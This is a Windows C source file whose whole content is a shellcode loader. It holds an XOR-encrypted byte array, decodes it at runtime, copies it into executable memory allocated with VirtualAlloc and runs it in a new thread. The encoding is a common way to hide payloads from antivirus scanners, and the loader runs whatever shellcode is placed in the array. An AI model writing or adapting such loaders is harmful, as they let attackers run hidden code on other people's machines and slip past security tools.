#include <Windows.h>
#include <stdio.h>

// output from Python script
unsigned char shellcode[] = {
0x73, 0x41, 0x31, 0x73, 0xde, 0x8e, 0x5e, 0x9b, 0x78, 0x18, 0xdd, 0x9b, 0x63, 0xce, 0x21, 0xdb, 0x9a, 0x21, 0xdc, 0xa6, 0x21, 0xdc, 0xb6, 0x21, 0xec, 0xa2, 0x21, 0xd4, 0x8a, 0x21, 0x9c, 0x92, 0xe5, 0xb2, 0xdf, 0x59, 0xf3, 0xab, 0x7b, 0x55, 0x4b, 0xca, 0x21, 0xc6, 0x8e, 0x8e, 0x21, 0xef, 0x96, 0x21, 0xfe, 0x82, 0xd2, 0xab, 0x40, 0x21, 0xe0, 0xb2, 0x21, 0xf0, 0x8a, 0xab, 0x41, 0x49, 0x9e, 0xe3, 0x21, 0x9e, 0x21, 0xab, 0x44, 0x9b, 0x55, 0x9b, 0x6a, 0x56, 0x06, 0x2e, 0x6a, 0xde, 0xad, 0x6b, 0x65, 0xa7, 0xab, 0x6d, 0x41, 0x5e, 0x91, 0xd6, 0x8e, 0x82, 0xdf, 0x4b, 0x21, 0xf0, 0x8e, 0xab, 0x41, 0xcc, 0x21, 0xa6, 0xe1, 0x21, 0xf0, 0xb6, 0xab, 0x41, 0x21, 0xae, 0x21, 0xab, 0x42, 0x23, 0xee, 0x8e, 0xb6, 0xcb, 0x69, 0x18, 0xa2, 0x83, 0x7e, 0x23, 0x4f, 0x23, 0x68, 0xc2, 0x24, 0xe4, 0xa4, 0x46, 0xf8, 0x42, 0x35, 0x55, 0x55, 0x55, 0x23, 0xef, 0xae, 0x11, 0xd4, 0x72, 0x48, 0xd9, 0x2d, 0xb6, 0x8e, 0xf8, 0x42, 0x24, 0x55, 0x55, 0x55, 0x23, 0xef, 0xa2, 0xc2, 0xc6, 0xc6, 0x8a, 0xeb, 0xc2, 0x99, 0x98, 0x84, 0xce, 0xc2, 0xdf, 0xd9, 0xcf, 0xd8, 0x9a, 0x71, 0x22, 0xf6, 0x8e, 0xa0, 0x23, 0x4c, 0xfc, 0x55, 0xff, 0xae, 0x23, 0x68, 0xfa, 0x11, 0x02, 0x08, 0xe7, 0x16, 0x2d, 0xb6, 0x8e, 0xf8, 0x42, 0xf5, 0x55, 0x55, 0x55, 0xc2, 0xd2, 0xee, 0xf2, 0x8a, 0x9b, 0x71, 0x22, 0xf6, 0x8e, 0xa8, 0x23, 0x49, 0xc2, 0xcd, 0xcd, 0xcb, 0xf2, 0xc2, 0xc5, 0x8a, 0xc4, 0xc3, 0xc2, 0xc2, 0xcf, 0xc6, 0xc6, 0x9b, 0x63, 0x22, 0xe6, 0x8e, 0xa1, 0x23, 0x4b, 0x9b, 0x78, 0xf8, 0xf9, 0xfb, 0xf8, 0x55, 0x7a, 0x9b, 0x6a, 0xfa, 0x55, 0xff, 0xa2
};

const unsigned char xor_key = 0xAA;

void xor_decrypt(unsigned char* data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; ++i) {
        data[i] ^= key;
    }
}

int main(int argc, char** argv) {
    xor_decrypt(shellcode, sizeof(shellcode), xor_key);
    LPVOID allocated_mem = VirtualAlloc(NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (allocated_mem == NULL) {
        printf("Failed to allocate memory: %d\n", GetLastError());
        return 1;
    } else { printf("Memory Allocated at address: 0x%p\n", allocated_mem); }

    RtlCopyMemory(allocated_mem, shellcode, sizeof(shellcode));
    printf("Shellcode written\n");
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create thread: %d\n", GetLastError());
        return 1;
    }
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(allocated_mem, 0, MEM_RELEASE);
    return 0;
}
